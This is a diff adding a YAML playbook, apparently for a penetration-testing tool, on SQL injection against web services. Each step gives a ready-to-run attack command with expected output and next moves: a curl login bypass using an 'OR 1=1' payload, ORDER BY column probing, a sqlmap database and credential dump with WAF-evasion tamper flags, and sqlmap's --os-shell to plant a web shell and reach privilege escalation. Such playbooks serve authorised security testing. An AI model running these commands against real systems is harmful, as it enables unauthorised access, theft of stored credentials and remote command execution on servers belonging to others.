@@ -1,0 +1,77 @@
+id: sqli-sqlmap
+name: SQL Injection & SQLMap Exploitation
+category: web
+description: Methodology for SQL Injection vulnerabilities. Covers authentication bypasses, manual UNION column extraction, database fingerprinting, automated SQLMap dumping, and OS shells.
+port_triggers:
+  - 80
+  - 443
+  - 8000
+  - 8080
+  - 8443
+  - 8978
+service_triggers:
+  - http
+  - https
+  - web
+tags:
+  - sqli
+  - sqlmap
+  - database
+  - web
+steps:
+  - id: sqli-auth-bypass
+    title: Authentication Form SQL Bypass
+    phase: exploitation
+    purpose: Bypass login authentication by injecting boolean tautology payloads into username/password parameters.
+    command: curl -s -X POST -d "username=admin' OR 1=1-- -&password=foo" "{{TARGET_URL}}/login.php" -i
+    expected_output:
+      - HTTP/1.1 302 Found
+      - 'Location: dashboard.php'
+      - 'Set-Cookie: session=eyJ...'
+    common_mistakes:
+      - 'Not testing comment variations for different database engines: MySQL (`-- -`, `#`), MSSQL (`--`), SQLite (`--`).'
+    if_success: Bypassed authentication! Use session cookie in browser to access admin dashboard.
+    if_failure: Login failed. Try manual UNION-based SQLi discovery.
+    references:
+      - https://portswigger.net/web-security/sql-injection
+  - id: sqli-union-columns
+    title: Manual Column Count Discovery (ORDER BY)
+    phase: enumeration
+    purpose: Determine the exact number of columns returned by the query by incrementing `ORDER BY N` until an error occurs.
+    command: curl -s "{{TARGET_URL}}/search.php?id=1' ORDER BY 5-- -"
+    expected_output:
+      - Unknown column 5 in order clause (Means query has exactly 4 columns)
+    common_mistakes:
+      - Column indexing is 1-based; if ORDER BY 5 errors but ORDER BY 4 succeeds, you have 4 columns.
+    if_success: Column count identified! Proceed to UNION SELECT banner and credential dumping.
+    if_failure: No error returned. Test boolean-based blind or time-based blind SQLi.
+    references:
+      - https://portswigger.net/web-security/sql-injection
+  - id: sqli-sqlmap-dump
+    title: Automated Database Dump (SQLMap)
+    phase: exploitation
+    purpose: Use SQLMap to automatically enumerate DBMS databases, tables, and dump application user credentials.
+    command: sqlmap -u "{{TARGET_URL}}/search.php?id=1" --batch --dbs --dump
+    expected_output:
+      - '[+] Available databases: [app_db, mysql, information_schema]'
+      - 'Database: app_db | Table: users | 2 entries dumped'
+    common_mistakes:
+      - Not passing session cookies with `--cookie` when scanning authenticated endpoints.
+    if_success: Database dumped! Extract password hashes and crack with Hashcat.
+    if_failure: WAF blocking SQLMap requests. Add `--tamper=space2comment,between` flags.
+    references:
+      - https://portswigger.net/web-security/sql-injection
+  - id: sqli-os-shell
+    title: SQLMap Interactive OS Shell Drop
+    phase: exploitation
+    purpose: Upload a web shell via SQL injection (INTO OUTFILE / xp_cmdshell) to obtain an interactive operating system shell.
+    command: sqlmap -u "{{TARGET_URL}}/search.php?id=1" --os-shell --batch
+    expected_output:
+      - '[+] Which web application language does the web server support? [1] PHP'
+      - os-shell> whoami
+    common_mistakes:
+      - Requires writable directory permission in webroot or database administrative privileges.
+    if_success: Operating system shell spawned! Proceed to privilege escalation.
+    if_failure: File write permission denied. Manually inspect extracted database credentials.
+    references:
+      - https://portswigger.net/web-security/sql-injection
